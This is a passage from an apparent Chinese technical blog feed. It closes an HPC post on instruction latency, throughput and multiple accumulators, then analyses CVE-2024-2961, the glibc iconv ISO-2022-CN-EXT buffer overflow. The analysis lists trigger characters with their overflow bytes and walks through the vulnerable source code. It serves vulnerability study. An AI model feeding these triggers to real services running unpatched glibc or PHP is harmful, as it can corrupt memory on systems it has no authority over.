<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* volatile */</span> <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="number">50</span>)</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>向量化后的代码每个元素处理时间为 0.3 个周期，性能瓶颈主要来自内存访问。</p>
<p>编译器通常能够向量化任何没有分支或迭代之间没有依赖关系的循环。如果循环存在少量的复杂变体，例如包含只有一个 <code>if</code> 而没有 <code>else</code> 的简单循环，编译器也能进行向量化优化。但对于更复杂的循环，向量化则变得非常复杂，可能需要一些技术，例如掩码处理和寄存器内的重新排列。</p>
<h4 id="指令表"><a href="#指令表" class="headerlink" title="指令表"></a>指令表</h4><p>在数字电子学中，交错执行（Interleaving execution stages）是一种常见的优化方式，它不仅应用于 CPU 的主流水线（pipeline），还用于单个指令的执行单元以及内存操作。大多数<strong>执行单元</strong>都有自己的小型流水线，并且通常可以在前一条指令执行一两周期后，就接受另一条指令。</p>
<p>在现代 CPU 体系结构中，<strong>执行单元</strong>（Execution Units）是处理特定类型指令的硬件模块。不同的指令类别通常由专门的执行单元处理。例如：</p>
<ul>
<li><strong>整数运算单元（ALU, Arithmetic Logic Unit）</strong>：用于执行 <code>add</code>、<code>sub</code>、<code>cmp</code> 等整数运算。</li>
<li><strong>浮点运算单元（FPU, Floating Point Unit）</strong>：用于执行 <code>mulss</code>、<code>divss</code> 等浮点数运算。</li>
<li><strong>加载/存储单元（Load/Store Unit, LSU）</strong>：用于 <code>mov r, m</code>、<code>mov m, r</code> 等内存访问指令。</li>
<li><strong>分支单元（Branch Unit）</strong>：用于 <code>jmp</code>、<code>call</code>、<code>ret</code> 等控制流指令。</li>
</ul>
<p>这些执行单元通常也是流水线化的（Pipelined），并且现代 CPU 可能会有<strong>多个相同类型的执行单元</strong>，以提高吞吐量。可以把 CPU 的流水线看作是<strong>多个层级的流水线结构</strong>。</p>
<p>以下是一些常见的 CPU 资源分配：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>流水线阶段</strong></th>
<th><strong>可能涉及的硬件单元</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>取指（IF）</strong></td>
<td>指令缓存（L1I Cache）、<strong>IFU</strong>取指单元</td>
</tr>
<tr>
<td><strong>解码（ID）</strong></td>
<td>指令解码单元、寄存器重命名单元</td>
</tr>
<tr>
<td><strong>执行（EX）</strong></td>
<td><strong>ALU</strong>（整数运算）、<strong>FPU</strong>（浮点运算）、<strong>SIMD</strong>（矢量指令）、<strong>AGU</strong>（地址计算单元）</td>
</tr>
<tr>
<td><strong>访存（MEM）</strong></td>
<td><strong>LSU</strong>（加载/存储单元）、L1/L2 Cache</td>
</tr>
<tr>
<td><strong>写回（WB）</strong></td>
<td>寄存器文件、提交队列</td>
</tr>
</tbody>
</table>
</div>
<p>所以在这种情况下，有两种不同衡量指令花费的标准，一种是延迟（<em>Latency</em>），另一种是吞吐量（<em>Throughput</em>）。</p>
<ul>
<li><p><strong>延迟（Latency）</strong>：指令的执行结果需要多少个周期（cycles）才能获得。</p>
</li>
<li><p><strong>吞吐量（Throughput）</strong>：平均每个周期可以执行多少条该指令。</p>
</li>
</ul>
<p>对于特定的 CPU 架构，我们可以通过<strong>指令表（Instruction Tables）</strong>来获取这些数值。以下是 <strong>AMD Zen 2</strong> 架构上一些指令的示例（所有操作数均为 32 位）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>延迟（Latency）</th>
<th>反向吞吐量（Reciprocal Throughput）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>jmp</code></td>
<td>-</td>
<td>2</td>
</tr>
<tr>
<td><code>mov r, r</code></td>
<td>-</td>
<td>1/4</td>
</tr>
<tr>
<td><code>mov r, m</code></td>
<td>4</td>
<td>1/2</td>
</tr>
<tr>
<td><code>mov m, r</code></td>
<td>3</td>
<td>1</td>
</tr>
<tr>
<td><code>add</code></td>
<td>1</td>
<td>1/3</td>
</tr>
<tr>
<td><code>cmp</code></td>
<td>1</td>
<td>1/4</td>
</tr>
<tr>
<td><code>popcnt</code></td>
<td>1</td>
<td>1/4</td>
</tr>
<tr>
<td><code>mul</code></td>
<td>3</td>
<td>1</td>
</tr>
<tr>
<td><code>div</code></td>
<td>13-28</td>
<td>13-28</td>
</tr>
</tbody>
</table>
</div>
<p><strong>吞吐量的倒数（Reciprocal Throughput）</strong></p>
<ul>
<li>因为人们通常习惯于<strong>“数值越大代表开销越大”</strong>的成本模型，所以更常用<strong>反向吞吐量</strong>（Reciprocal Throughput），即每条指令平均需要多少个周期才能执行完一条（而不是每周期执行多少条）。</li>
</ul>
<p><strong>指令执行单元的复用</strong></p>
<ul>
<li>如果某条指令非常频繁，CPU 可能会复制其执行单元，以提高吞吐量（但通常不会超过解码宽度）。</li>
<li>例如，<code>add</code> 具有 1/3 的吞吐量，这表示多个 <code>add</code> 指令可以在不同的执行单元中同时进行。</li>
</ul>
<p><strong>流水线执行</strong></p>
<ul>
<li>许多指令都是<strong>流水线化（Pipelined）</strong>的。例如，<strong>如果某条指令的吞吐量倒数是 <code>n</code>，通常意味着它的执行单元可以在 <code>n</code> 个周期后接受另一条同样的指令</strong>。</li>
<li>如果吞吐量倒数小于 1（如 <code>mov r, r</code> 的 1/4），表示 CPU 可能有多个执行单元，可以在同一周期并行执行多条这样的指令。</li>
</ul>
<p><strong>变量延迟（Variable Latency）</strong></p>
<ul>
<li><strong>某些指令的延迟会根据操作数的值和大小而变化</strong>。</li>
<li><strong>内存访问指令（如 <code>mov r, m</code>）的延迟通常按最优情况（L1 缓存命中）计算</strong>。如果数据来自 L2 或者更慢的内存层级，延迟会显著增加。</li>
</ul>
<p>优化延迟通常和优化吞吐量有很大的不同，</p>
<p>假设有一个数组求和的代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>如果我们假设：</p>
<ul>
<li><strong>编译器没有向量化</strong>（SIMD 没有被使用）。</li>
<li><strong>访存不是瓶颈</strong>（假设数据已在 L1 缓存中）。</li>
<li><strong>循环已展开</strong>（即手动展开循环，消除循环变量维护的额外开销）。</li>
</ul>
<p>那么，它会被展开成：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">s += a[<span class="number">0</span>];</span><br><span class="line">s += a[<span class="number">1</span>];</span><br><span class="line">s += a[<span class="number">2</span>];</span><br><span class="line">s += a[<span class="number">3</span>];</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>
<p>由于 <code>add</code> 指令的<strong>延迟为 1</strong>，每次 <code>s += a[i]</code> 操作都依赖于前一次计算的 <code>s</code>，<strong>导致只能每个周期执行 1 次 <code>add</code></strong>，即 <strong>处理 1 个数组元素/周期</strong>。</p>
<p>然而，我们注意到 <strong>Zen 2 处理器的 <code>add</code> 吞吐量是 2</strong>，也就是说 <strong>CPU 实际上每个周期可以执行 2 次 <code>add</code></strong>，但当前代码无法利用这个能力，因为每个 <code>add</code> 依赖于上一次的 <code>s</code>，存在<strong>数据依赖</strong>。这里说add的吞吐量为2，好像与上面表中说明吞吐量为3相悖，实际是因为<strong>寄存器到寄存器的 <code>add</code> 指令吞吐量很高（4），但如果 <code>add</code> 的操作数之一来自内存，它的执行速度就会受到内存读取的吞吐量限制（2）</strong>。</p>
<p>假设 CPU 里有 <strong>4 条 ALU 管道</strong> 专门用于 <code>add</code> 操作，而有 <strong>2 条 Load/Store 单元（LSU）</strong> 用于 <code>mov</code>（内存加载）。</p>
<ul>
<li><strong>如果 <code>add</code> 只用 ALU（<code>reg, reg</code>），它可以 4 条并行执行</strong>。</li>
<li><strong>如果 <code>add</code> 需要访问内存（<code>reg, [mem]</code>），它必须先经过 LSU 加载数据</strong>，但 <strong>LSU 只有 2 条管道，所以吞吐量上限是 2</strong>。</li>
</ul>
<p>你可以把 <code>add reg, reg</code> 想象成 <strong>一条 4 车道的高速公路</strong>，而 <code>add reg, [mem]</code> 受限于 <strong>2 车道的收费站</strong>，所以即使后面有 4 车道，整体吞吐量还是受限于 2 车道的瓶颈。</p>
<p><strong>解决方案：使用多个累加器</strong></p>
<p>为了提高吞吐量，我们可以使用<strong>两个独立的累加器</strong>，分别求和奇数索引和偶数索引的元素：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> s0 = <span class="number">0</span>, s1 = <span class="number">0</span>;</span><br><span class="line">s0 += a[<span class="number">0</span>];</span><br><span class="line">s1 += a[<span class="number">1</span>];</span><br><span class="line">s0 += a[<span class="number">2</span>];</span><br><span class="line">s1 += a[<span class="number">3</span>];</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">int</span> s = s0 + s1;</span><br></pre></td></tr></table></figure></div>
<p><strong>这样做的好处是：</strong></p>
<ul>
<li><strong>s0 和 s1 互不依赖</strong>，可以<strong>并行执行</strong>。</li>
<li>由于 <code>add</code> 吞吐量是 <strong>2</strong>，CPU <strong>每个周期可以执行 2 条 <code>add</code> 指令</strong>，所以<strong>数组求和的吞吐量提高了一倍</strong>。</li>
<li>计算完成后，我们再执行 <code>s0 + s1</code>，这只是一次额外的 <code>add</code>，不会显著影响性能。</li>
</ul>
<p><strong>一般情况：多累加器策略</strong></p>
<p>如果某条指令：</p>
<ul>
<li><strong>延迟（Latency）= x</strong></li>
<li><strong>吞吐量（Throughput）= y</strong></li>
</ul>
<p>那么，要<strong>完全利用 CPU 的执行单元</strong>，我们需要 <strong>x × y 个独立的累加器</strong>，以确保 CPU 在任何时刻都有足够的指令可以执行，不会被数据依赖阻塞。</p>
<p>对于 <code>add</code>：</p>
<ul>
<li><strong>Latency = 1</strong></li>
<li><strong>Throughput = 2</strong></li>
</ul>
<p>因此，我们需要<strong>1 × 2 = 2 个累加器</strong>（s0 和 s1），刚好匹配 CPU 资源，最大化吞吐量。</p>
<p>在优化循环时，我们通常：</p>
<ol>
<li><strong>确定 CPU 关键的执行端口</strong>（Execution Ports）—— 不同指令可能使用不同的执行端口。</li>
<li><strong>分析循环中各个指令的吞吐量</strong>，找出最可能成为瓶颈的指令。</li>
<li><strong>使用机器代码分析工具</strong>（如 LLVM’s <code>llvm-mca</code>、Intel VTune、uops.info）来查看<strong>哪条指令最占用资源</strong>，然后针对性优化。</li>
</ol>
]]></content>
      <categories>
        <category>HPC</category>
      </categories>
      <tags>
        <tag>HPC</tag>
        <tag>optimization</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2024-2961</title>
    <url>/blog/2024/09/21/CVE-2024-2961/</url>
    <content><![CDATA[<h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc/iconvdata/iso-2022-cn-ext.c中查看</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
<p><strong>set</strong>是当前的字符集标识</p>
<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
</ul>
<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
</ul>
<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
</ul>
<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
<ul>
<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
</ul>
<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
<p>我们现在详细分析下3个if分支的条件</p>
<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>    </p>
<ul>
<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
</li>
<li><p>(ann &amp; SO_ann) != (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
</li>
<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
</li>
</ul>
<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
<p><strong>3.生成转义序列</strong>：</p>
<ul>
<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
<li>更新已声明的字符集<code>ann</code>。</li>
</ul>
<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
